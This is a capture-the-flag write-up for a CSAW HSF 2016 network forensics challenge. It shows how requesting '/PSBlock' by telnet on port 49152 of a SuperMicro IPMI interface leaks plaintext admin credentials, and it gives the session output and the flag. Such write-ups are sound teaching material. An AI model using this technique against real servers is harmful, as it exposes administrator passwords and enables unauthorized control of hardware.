# CSAW HSF 2016 Prelims: IPMI Server Got Owned

**Category:** Network Forensics
**Points:** 300
**Solves:** ?
**Description:**

> We don’t need security on embedded devices anyway, right?
> 
> http://prod_atl_dc3_r49_u23.rogueterminal.com/
> 
> Challenge by Gus Naughton

## Write-up

When we navigate to ``23.226.239.10``, we are greeted with a SuperMicro IPMI server login page. Looking up SuperMicro IPMI vulnerabilities, we stumble upon this link: [http://serverfault.com/questions/606877/how-to-check-if-my-supermicro-ipmi-is-compromised-with-plaintext-admin-password] (http://serverfault.com/questions/606877/how-to-check-if-my-supermicro-ipmi-is-compromised-with-plaintext-admin-password). It details that the plaintext password to the admin interface on IPMI devices can be accessed by connecting to the server motherboard on port 49152 and running ``GET /PSBlock``.

```bash
$ telnet 23.226.239.10 49152
Trying 23.226.239.10...
Connected to 23.226.239.10.
Escape character is '^]'.
ATEN SMASH-CLP System Management Shell, version 1.02
Copyright (c) 2008-2009 by ATEN International CO., Ltd.
All Rights Reserved

GET /PSBlock
=%}?
0adminADMIN**ADMIN**;TTroot**flag{1PM1_1S_MUY_1N$3CUR3_LOPL}**???%?v?i?o???DDD@??
```

### Flag

``flag{1PM1_1S_MUY_1N$3CUR3_LOPL}``

## Other write-ups and resources

### Resources
* [http://serverfault.com/questions/606877/how-to-check-if-my-supermicro-ipmi-is-compromised-with-plaintext-admin-password] (http://serverfault.com/questions/606877/how-to-check-if-my-supermicro-ipmi-is-compromised-with-plaintext-admin-password)

### Other write-ups
* (none yet)

